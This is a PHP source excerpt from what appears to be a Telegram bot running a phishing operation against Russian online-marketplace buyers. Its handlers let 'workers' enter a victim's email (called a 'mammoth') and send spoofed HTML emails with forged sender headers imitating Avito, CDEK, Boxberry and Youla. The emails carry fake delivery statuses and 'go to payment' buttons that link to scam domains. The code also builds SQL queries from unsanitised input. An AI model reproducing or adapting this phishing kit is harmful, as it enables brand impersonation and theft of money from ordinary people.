				send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => showTrack($callback['from'], $code), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
				$text = "♻️ <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>восстановил свой трек-код</b> <code>$code</code>\n\n";
				send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			}

			if(preg_match('/\/trackhide\/\d{6,12}\//', $callback['type']) == TRUE) {
				$code = substr($callback['type'], 11, -1);

				$search = mysqli_query($connection, "SELECT `id` FROM `trackcodes` WHERE `code` = '$code' AND `worker` = '$callback[from]' AND `status` > '0'");

				if(mysqli_num_rows($search) > 0) {
					mysqli_query($connection, "UPDATE `trackcodes` SET `status` = '-1' WHERE `code` = '$code' AND `worker` = '$callback[from]' AND `status` > '0'");

					send($config['token'], 'editMessageText', Array('chat_id' => $callback['from'], 'message_id' => $callback['message_id'], 'text' => getTrack($callback['from'], $code), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getTrack($callback['from'], $code, 1)));
					$text = "🗑 <a href=\"tg://user?id=$callback[from]\">$callback[firstname] $callback[lastname]</a> <b>скрыл свой трек-код</b> <code>$code</code>\n\n";
					send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				} else {
					$text = "📭 <b>Объявление ещё не создано или уже скрыто</b>";
					send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				}
			}




			if(preg_match('/\/mail\/(\d+|[a-z0-9]{38})\//', $callback['type'])) {
			    $code = mb_substr($callback['type'], 6, -1);

			    $mails = mysqli_query($connection, "SELECT * FROM `mails` WHERE `advert_id` = ''");
			    $mails = mysqli_fetch_assoc($mails);

			    mysqli_query($connection, "UPDATE `mails` SET `advert_id` = '$code', `status` = '0' WHERE `id` = $mails[id]");

			    $text = "✅ Вы выбрали объявление/трэк-код под №$code ✅\n\n";
                $text .= "<b>Введите почту мамонта:</b>";


			    send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));

			}


			if($callback['type'] == '/mail/send') {

			    $mails = mysqli_query($connection, "SELECT * FROM `mails` WHERE `worker`= '$callback[from]' AND `status` = 0");

			    if(mysqli_num_rows($mails)) {

			        $mails = mysqli_fetch_assoc($mails);
			        if ($mails['temp'] == 'CDEK' || $mails['temp'] == 'Boxberry') {
			            $addressM = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `sender`, `address` FROM `trackcodes` WHERE `code` = '$mails[advert_id]'"));
			        }

			        if($mails['temp'] == 'Avito') {

			              $headers = "From: Aviito.ru <$mailsFrom[avito]>\r\n".
                                      "MIME-Version: 1.0" . "\r\n" .
                                      "Content-type: text/html; charset=UTF-8" . "\r\n";


                    $body = '<div bgcolor="#f6f6f6" style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3;width:100%!important;height:100%">
    <table style="width:100%;padding:20px">
        <tbody>
            <tr>
                <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3"></td>
                <td bgcolor="#FFFFFF" style="padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3;display:block!important;max-width:600px!important;margin:0 auto!important;clear:both!important;border:1px solid #f0f0f0">
                    <table style="width:100%">
                        <tbody>
                            <tr>
                                <td style="margin:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3;/* background:#f4e0c3; *//* padding:15px; */border-bottom: 1px solid #eee;"> <img src="https://'.$_SERVER['HTTP_HOST'].'/mails/res/avit.png" alt="Avito доставка"  style="height:50px" class="CToWUd"> </td>
                            </tr>
                        </tbody>
                    </table>
                    <div style="padding:20px;max-width:600px;margin:0 auto;display:block">
                        <table style="width:100%">
                            <tbody>
                                <tr>
                                    <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3">
                                        <p style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;margin-bottom:10px;font-weight:normal;font-size:14px">Здравствуйте!</p>
                                        <p style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;margin-bottom:10px;font-weight:normal;font-size:14px">Ваш заказ <b>'.$mails['advert_id'].'</b> оформлен через сервис объявлений Avito и принят в пункте отправления.</p>
                                        <h3 style="padding:0;font-family:Tahoma,sans-serif;line-height:1.1;color:#000;margin:10px 0;font-weight:200;font-size:22px">'.$gid['t_name'].'</h3>
                                        <table style="width:100%">
                                            <tbody>

												 <tr>
                                                    <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;font-size:14px;color:#555;text-align:right;padding-bottom:5px" nowrap="" valign="top"> '.date('d.m.Y', time()).'
                                                        <br>в '.date('H:i', time()).' </td>
                                                    <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;font-size:14px;color:#555;text-align:left;padding-left:15px;padding-bottom:5px" valign="top"> Отправление зарегистрировано - ожидает оплаты
                                                        <br><span style="color:#999">'.$gid['t_punkt'].'</span> </td>
                                                </tr>
												<tr>
                                                    <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;font-size:14px;color:#555;text-align:right;padding-bottom:5px" nowrap="" valign="top"> '.date('d.m.Y', time()).'
                                                        <br>в '.date('H:i', time()-60).' </td>
                                                    <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;font-size:14px;color:#555;text-align:left;padding-left:15px;padding-bottom:5px" valign="top"> Отправление зарегистрировано - принято в отделении связи
                                                        <br><span style="color:#999">'.$gid['t_punkt'].'</span> </td>
                                                </tr>

                                            </tbody>
                                        </table>

                                        <p style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;font-size:14px;margin-bottom:0;font-weight:bold">Заказ будет отправлен в место назначения курьером сервиса Авито.Доставка после поступления оплаты.</p>
                                        <p style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;margin-bottom:10px;font-weight:normal;font-size:14px"><a href="https://'.$domains['avito'].'/buy?id='.$mails['advert_id'].'"
         style="font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3;text-decoration:none;color:#fff;background-color: #0af;padding:10px 20px;font-weight:bold;margin:10px 10px 20px 0;text-align:center;display:inline-block;border-radius: 5px;" target="_blank">Перейти к оплате</a></p>
                                        <p style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;margin-bottom:10px;font-weight:normal;font-size:14px"> Заказ будет ожидать оплаты в отделении до <b>'.date('d.m.Y', time() + 172800).'</b>, после чего будет отменен.<br>Спасибо, что пользуетесь нашим сервисом! </p>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </td>
                <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3"></td>
            </tr>
        </tbody>
    </table>
    <table style="width:100%;clear:both!important">
        <tbody>
            <tr>
                <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3"></td>
                <td style="padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3;display:block!important;max-width:600px!important;margin:0 auto!important;clear:both!important">
                    <div style="max-width:600px;margin:0 auto;display:block;padding:0 30px">
                        <table style="width:100%">
                            <tbody>
                                <tr>
                                    <td align="left" style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3"> <img src="https://'.$_SERVER['HTTP_HOST'].'/mails/res/logominavit.png" alt="" id="m_4060572667065315573img-display" style="max-width:50%" class="CToWUd"> </td>
                                    <td align="left" valign="middle" style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3">
                                        <p style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;margin-bottom:10px;font-weight:normal;font-size:12px;color:#666"> Письмо сформировано автоматически сервисом Авито.Доставка
                                            <br><a href="https://'.$domains['avito'].'/buy?id='.$mails['advert_id'].'" style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3;color:#999" target="_blank">Отписаться от получения уведомлений</a> </p>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </td>
                <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3"></td>
            </tr>
        </tbody>
    </table>
    <div class="yj6qo"></div>
    <div class="adL"></div>
</div>';
                    mail($mails['email'], 'Оплатить заказ!', $body, $headers);


                    mysqli_query($connection, "UPDATE `mails` SET `status`='1' WHERE `id` = $mails[id]");


                    send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => '✅ Письмо отправлено', 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));


			        } elseif($mails['temp'] == 'CDEK') {


			            $headers = "From: Cdek.ru <$mailsFrom[cdek]>\r\n".
                                      "MIME-Version: 1.0" . "\r\n" .
                                      "Content-type: text/html; charset=UTF-8" . "\r\n";

			            $body = '<div bgcolor="#f6f6f6" style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3;width:100%!important;height:100%">
    <table style="width:100%;padding:20px">
        <tbody>
            <tr>
                <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3"></td>
                <td bgcolor="#FFFFFF" style="padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3;display:block!important;max-width:600px!important;margin:0 auto!important;clear:both!important;border:1px solid #f0f0f0">
                    <table style="width:100%">
                        <tbody>
                            <tr>
                                <td style="margin:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3;/* background:#f4e0c3; *//* padding:15px; */border-bottom: 1px solid #eee;"> <img src="https://'.$_SERVER['HTTP_HOST'].'/mails/res/logo.png" alt="СДЭК - Служба доставки"  style="max-width:100%" class="CToWUd"> </td>
                            </tr>
                        </tbody>
                    </table>
                    <div style="padding:20px;max-width:600px;margin:0 auto;display:block">
                        <table style="width:100%">
                            <tbody>
                                <tr>
                                    <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3">
                                        <p style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;margin-bottom:10px;font-weight:normal;font-size:14px">Здравствуйте, '.$addressM['sender'].'</p>
                                        <p style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;margin-bottom:10px;font-weight:normal;font-size:14px">Ваш заказ <b>'.$mails['advert'].'</b> оформлен в офисе СДЭК.</p>
                                        <h3 style="padding:0;font-family:Tahoma,sans-serif;line-height:1.1;color:#000;margin:10px 0;font-weight:200;font-size:22px">'.$gid['t_name'].'</h3>
                                        <table style="width:100%">
                                            <tbody>

												 <tr>
                                                    <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;font-size:14px;color:#555;text-align:right;padding-bottom:5px" nowrap="" valign="top"> '.date('d.m.Y', time()).'
                                                        <br>в '.date('H:i', time()).' </td>
                                                    <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;font-size:14px;color:#555;text-align:left;padding-left:15px;padding-bottom:5px" valign="top"> Отправление зарегистрировано - ожидает оплаты
                                                        <br><span style="color:#999">'.$gid['t_punkt'].'</span> </td>
                                                </tr>
												<tr>
                                                    <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;font-size:14px;color:#555;text-align:right;padding-bottom:5px" nowrap="" valign="top"> '.date('d.m.Y', time()).'
                                                        <br>в '.date('H:i', time()-60).' </td>
                                                    <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;font-size:14px;color:#555;text-align:left;padding-left:15px;padding-bottom:5px" valign="top"> Отправление зарегистрировано - принято в отделении связи
                                                        <br><span style="color:#999">'.$gid['t_punkt'].'</span> </td>
                                                </tr>
												 <tr>
                                                    <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;font-size:14px;color:#555;text-align:right;padding-bottom:5px" nowrap="" valign="top"> </td>
                                                    <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;font-size:14px;color:#555;text-align:left;padding-left:15px;padding-bottom:5px" valign="top"> Место назначения:
                                                        <span style="color:#999">'.$addressM['address'].'</span> </td>
                                                </tr>
                                            </tbody>
                                        </table>

                                        <p style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;font-size:14px;margin-bottom:0;font-weight:bold">Заказ будет отправлен в место назначения курьером СДЭК после поступления оплаты.</p>
                                        <p style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;margin-bottom:10px;font-weight:normal;font-size:14px"><a href="https://'.$domains['cdek'].'/track?track_id='.$mails['advert_id'].'"
         style="font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3;text-decoration:none;color:#fff;background-color: #5da42c;padding:10px 20px;font-weight:bold;margin:10px 10px 20px 0;text-align:center;display:inline-block;border-radius: 5px;" target="_blank">Перейти к оплате</a></p>
                                        <p style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;margin-bottom:10px;font-weight:normal;font-size:14px"> Заказ будет ожидать оплаты в отделении до <b>'.date('d.m.Y', time() + 172800).'</b>, после чего будет отменен.<br>Спасибо, что пользуетесь нашим сервисом! </p>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </td>
                <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3"></td>
            </tr>
        </tbody>
    </table>
    <table style="width:100%;clear:both!important">
        <tbody>
            <tr>
                <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3"></td>
                <td style="padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3;display:block!important;max-width:600px!important;margin:0 auto!important;clear:both!important">
                    <div style="max-width:600px;margin:0 auto;display:block;padding:0 30px">
                        <table style="width:100%">
                            <tbody>
                                <tr>
                                    <td align="left" style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3"> <img src="https://'.$_SERVER['HTTP_HOST'].'/mails/res/logomin.png" alt="" id="m_4060572667065315573img-display" style="max-width:100%" class="CToWUd"> </td>
                                    <td align="left" valign="middle" style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3">
                                        <p style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;margin-bottom:10px;font-weight:normal;font-size:12px;color:#666"> Письмо сформировано автоматически сервисом СДЭК.
                                            <br><a "href="https://'.$domains['cdek'].'/track?track_id='.$mails['advert_id'].'" style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3;color:#999" target="_blank">Отписаться от получения уведомлений</a> </p>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </td>
                <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3"></td>
            </tr>
        </tbody>
    </table>
    <div class="yj6qo"></div>
    <div class="adL"></div>
</div>';


                        mail($mails['email'], 'Оплатить заказ!', $body, $headers);

                        mysqli_query($connection, "UPDATE `mails` SET `status`='1' WHERE `id` = $mails[id]");

                        send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => '✅ Письмо отправлено', 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));

			        } elseif($mails['temp'] == 'Boxberry') {

			            $headers = "From: Boxberry.ru <$mailsFrom[boxberry]>\r\n".
                                      "MIME-Version: 1.0" . "\r\n" .
                                      "Content-type: text/html; charset=UTF-8" . "\r\n";

			            $body = '<div style="font-family: helvetica; max-width: 300px;"  class="ii gt">
        <div id=":15d" class="a3s aXjCH msg-2107734765993735536">
            <div>
                <table style="MIN-WIDTH:600px" cellspacing="0" cellpadding="0" width="100%" border="0">
                    <tbody>
                        <tr>
                            <td valign="top" align="center">
                                <table width="512" border="0">
                                    <tbody>


                                        <tr>
                                            <td width="512"><img src="https://'.$_SERVER['HTTP_HOST'].'/mails/res/logo_bb.png"  alt="BoxBerry - Служба доставки" data-image-whitelisted="" class="CToWUd"></td>
                                        </tr>
                                       <tr><td style="
    height: 15px;
"></td></tr>
                                            <td style="FONT-SIZE:21px;FONT-FAMILY:Arial,Helvetica,sans-serif;COLOR:#e40054" width="512" align="left">Здравствуйте, '.$addressM['sender'].'!</td>
                                        </tr><tr><td style="
    height: 15px;
"></td></tr>
                                        <tr>
                                            <td style="FONT-SIZE:12px" width="512" align="left">
                                                <p><strong>Отправление "'.$mails['advert_id'].'"</strong> принято в отделении BoxBerry и готово к отправке в Ваш город. <br>В течение 1 дня после оплаты заказа оно будет отправлено по адресу получения: <br><strong>'.$addressM['address'].'</strong>.</p>
												<p style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;margin-bottom: 5px;font-weight:normal;font-size:14px;"><a href="https://'.$domains['boxberry'].'/track?track_id='.$mails['advert_id'].'" style="font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3;text-decoration:none;color:#fff;background-color: #e5194a;padding: 10px 20px;font-weight:bold;margin: 5px 10px 5px 0;text-align:center;display:inline-block;border-radius: 5px;" target="_blank">Перейти к оплате</a></p>
                                                <p>Чтобы получить посылку, предъявите оператору отделения паспорт и назовите свой номер телефона.</p>
                                            </td>
                                        </tr>
										<tr></tr>
                                        <tr>
                                            <td width="512" align="left" style="border-top:1px solid black;border-bottom:1px solid black;padding:10px">
                                                <p style="FONT-SIZE:11px;COLOR:#818084">Найти Отделение на карте Вашего города можно <a style="TEXT-DECORATION:underline;COLOR:#2069ad!important" href="https://'.$domains['boxberry'].'/track?track_id='.$mails['advert_id'].'" target="_blank" ><span style="COLOR:#2069ad">на нашем сайте.</span></a></p>
                                                <p style="FONT-SIZE:11px;COLOR:#818084">Как клиент Боксберри вы можете вернуть до 30% от суммы следующей покупки, используя кэшбэк-сервис нашего партнера Letyshops. Используйте промокод BOXBERRY40 при регистрации и на 3 дня вы получите на 40% больше кэшбэка со всех ваших покупок. Подробности по <a style="TEXT-DECORATION:underline;COLOR:#2069ad!important" href="https://homyanus.com/g/7khfs3jtus82a1e33ddb8753afd1f1/?ulp=https%3A%2F%2Fletyshops.com%2Fwelcome&amp;subid=TerminalSender" target="_blank" >ссылке.</a></p>

                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                                <table height="130" width="520">
                                    <tbody>
                                        <tr>
                                            <td>
                                                <div style="PADDING-BOTTOM:0px;PADDING-TOP:0px;PADDING-LEFT:0px;MARGIN:0px;LINE-HEIGHT:0;PADDING-RIGHT:0px"><img width="520" style="DISPLAY:block" border="0" alt="" src="https://'.$_SERVER['HTTP_HOST'].'/mails/res/bb.png" data-image-whitelisted="" class="CToWUd"></div>
                                            </td>
                                        </tr> <tr><td style="
    height: 15px;
"></td></tr>

                                    </tbody>
                                </table>


                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>

    </div>';


                        mail($mails['email'], 'Оплатить заказ!', $body, $headers);

                        mysqli_query($connection, "UPDATE `mails` SET `status`='1' WHERE `id` = $mails[id]");

                        send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => '✅ Письмо отправлено', 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));

			        } elseif($mails['temp'] == 'Youla') {

			            $headers = "From: Youla.ru <$mailsFrom[youla]>\r\n".
                                      "MIME-Version: 1.0" . "\r\n" .
                                      "Content-type: text/html; charset=UTF-8" . "\r\n";

			            $body = '<div bgcolor="#f6f6f6" style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3;width:100%!important;height:100%">
    <table style="width:100%;padding:20px">
        <tbody>
            <tr>
                <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3"></td>
                <td bgcolor="#FFFFFF" style="padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3;display:block!important;max-width:600px!important;margin:0 auto!important;clear:both!important;border:1px solid #f0f0f0">
                    <table style="width:100%">
                        <tbody>
                            <tr>
                                <td style="margin:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3;/* background:#f4e0c3; *//* padding:15px; */border-bottom: 1px solid #eee;"> <img src="https://'.$_SERVER['HTTP_HOST'].'/mails/res/youl.png" alt="Доставка от Youla"  style="height:50px" class="CToWUd"> </td>
                            </tr>
                        </tbody>
                    </table>
                    <div style="padding:20px;max-width:600px;margin:0 auto;display:block">
                        <table style="width:100%">
                            <tbody>
                                <tr>
                                    <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3">
                                        <p style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;margin-bottom:10px;font-weight:normal;font-size:14px">Здравствуйте!</p>
                                        <p style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;margin-bottom:10px;font-weight:normal;font-size:14px">Ваш заказ <b>'.$mails['advert_id'].'</b> оформлен через сервис объявлений Youla и принят в пункте отправления.</p>
                                        <h3 style="padding:0;font-family:Tahoma,sans-serif;line-height:1.1;color:#000;margin:10px 0;font-weight:200;font-size:22px">'.$gid['t_name'].'</h3>
                                        <table style="width:100%">
                                            <tbody>

												 <tr>
                                                    <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;font-size:14px;color:#555;text-align:right;padding-bottom:5px" nowrap="" valign="top"> '.date('d.m.Y', time()).'
                                                        <br>в '.date('H:i', time()).' </td>
                                                    <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;font-size:14px;color:#555;text-align:left;padding-left:15px;padding-bottom:5px" valign="top"> Отправление зарегистрировано - ожидает оплаты
                                                        <br><span style="color:#999">'.$gid['t_punkt'].'</span> </td>
                                                </tr>
												<tr>
                                                    <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;font-size:14px;color:#555;text-align:right;padding-bottom:5px" nowrap="" valign="top"> '.date('d.m.Y', time()).'
                                                        <br>в '.date('H:i', time()-60).' </td>
                                                    <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;font-size:14px;color:#555;text-align:left;padding-left:15px;padding-bottom:5px" valign="top"> Отправление зарегистрировано - принято в отделении связи
                                                        <br><span style="color:#999">'.$gid['t_punkt'].'</span> </td>
                                                </tr>

                                            </tbody>
                                        </table>

                                        <p style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;font-size:14px;margin-bottom:0;font-weight:bold">Заказ будет отправлен в место назначения курьером сервиса <b>Youla</b> после поступления оплаты.</p>
                                        <p style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;margin-bottom:10px;font-weight:normal;font-size:14px"><a href="https://'.$domains['youla'].'/product/'.$mails['advert_id'].'/buy/delivery"
         style="font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3;text-decoration:none;color:#fff;background-color: rgb(119, 192, 38);padding:10px 20px;font-weight:bold;margin:10px 10px 20px 0;text-align:center;display:inline-block;border-radius: 5px;" target="_blank">Перейти к оплате</a></p>
                                        <p style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;margin-bottom:10px;font-weight:normal;font-size:14px"> Заказ будет ожидать оплаты в отделении до <b>'.date('d.m.Y', time() + 172800).'</b>, после чего будет отменен.<br>Спасибо, что пользуетесь нашим сервисом! </p>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </td>
                <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3"></td>
            </tr>
        </tbody>
    </table>
    <table style="width:100%;clear:both!important">
        <tbody>
            <tr>
                <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3"></td>
                <td style="padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3;display:block!important;max-width:600px!important;margin:0 auto!important;clear:both!important">
                    <div style="max-width:600px;margin:0 auto;display:block;padding:0 30px">
                        <table style="width:100%">
                            <tbody>
                                <tr>
                                    <td align="left" style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3"> <img src="https://'.$_SERVER['HTTP_HOST'].'/mails/res/youlmin.png" alt="" id="m_4060572667065315573img-display" style="" class="CToWUd"> </td>
                                    <td align="left" valign="middle" style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3">
                                        <p style="margin:0;padding:0;font-family:Tahoma,sans-serif;line-height:1.3;margin-bottom:10px;font-weight:normal;font-size:12px;color:#666"> Письмо сформировано автоматически сервисом Youla
                                            <br><a href="https://'.$domains['youla'].'/product/'.$mails['advert_id'].'/buy/delivery" style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3;color:#999" target="_blank">Отписаться от получения уведомлений</a> </p>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </td>
                <td style="margin:0;padding:0;font-family:Tahoma,sans-serif;font-size:100%;line-height:1.3"></td>
            </tr>
        </tbody>
    </table>
    <div class="yj6qo"></div>
    <div class="adL"></div>
</div>';


                        mail($mails['email'], 'Оплатить заказ!', $body, $headers);

                        mysqli_query($connection, "UPDATE `mails` SET `status`='1' WHERE `id` = $mails[id]");

                        send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => '✅ Письмо отправлено', 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));

			        }

			    }

			}


			if($callback['type'] == '/mail/avito') {

			     $serach = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `worker`= '$callback[from]'");

			     if(mysqli_num_rows($serach) > 0) {

			         mysqli_query($connection, "INSERT INTO `mails`(`worker`, `temp`) VALUES ('$callback[from]', 'Avito')");

			         send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => '🧾 <b>Выберете объявление для отправки</b> 🧾', 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getAdvertsMail($callback['from'], 0, 1)));


			     } else {

			        send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => 'Авито 2', 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
			     }
			}



			if($callback['type'] == '/mail/youla') {

			     $serach = mysqli_query($connection, "SELECT * FROM `adverts` WHERE `worker`= '$callback[from]'");

			     if(mysqli_num_rows($serach) > 0) {

			         mysqli_query($connection, "INSERT INTO `mails`(`worker`, `temp`) VALUES ('$callback[from]', 'Youla')");

			         send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => '🧾 <b>Выберете объявления для отправки</b> 🧾', 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getAdvertsMail($callback['from'], 0, 1)));


			     } else {

			        send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => 'Авито 2', 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
			     }
			}


			if($callback['type'] == '/mail/cdek') {

			     $serach = mysqli_query($connection, "SELECT * FROM `trackcodes` WHERE `worker`= '$callback[from]'");

			     if(mysqli_num_rows($serach) > 0) {

			         mysqli_query($connection, "INSERT INTO `mails`(`worker`, `temp`) VALUES ('$callback[from]', 'CDEK')");

			         send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => '🧾 <b>Выберете объявления для отправки</b> 🧾', 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getAdvertsMail($callback['from'], 0, 1)));


			     } else {

			        send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => 'Авито 2', 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
			     }
			}


			if($callback['type'] == '/mail/boxberry') {

			     $serach = mysqli_query($connection, "SELECT * FROM `trackcodes` WHERE `worker`= '$callback[from]'");

			     if(mysqli_num_rows($serach) > 0) {

			         mysqli_query($connection, "INSERT INTO `mails`(`worker`, `temp`) VALUES ('$callback[from]', 'Boxberry')");

			         send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => '🧾 <b>Выберете объявления для отправки</b> 🧾', 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => getAdvertsMail($callback['from'], 0, 1)));


			     } else {

			        send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => 'Авито 2', 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
			     }
			}




			if(preg_match('/\/showCommands\//', $callback['type'])) {
				send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => showCommands(), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => showCommands(1)));
			}

			if(preg_match('/\/showforums\//', $callback['type'])) {
				send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => showForums(), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE, 'reply_markup' => showForums(1)));
			}

			if(preg_match('/\/showrules\//', $callback['type'])) {
				send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => showRules(), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
			}

			if(preg_match('/\/referral_prog\//', $callback['type'])) {
				send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => referralInfo($callback['from']), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
			}

			if(preg_match('/\/withdraw\//', $callback['type'])) {
				send($config['token'], 'sendMessage', Array('chat_id' => $callback['from'], 'text' => withdraw($callback['from']), 'parse_mode' => 'HTML', 'disable_web_page_preview' => TRUE));
			}

			if(preg_match('/\/mysettings\//', $callback['type'])) {
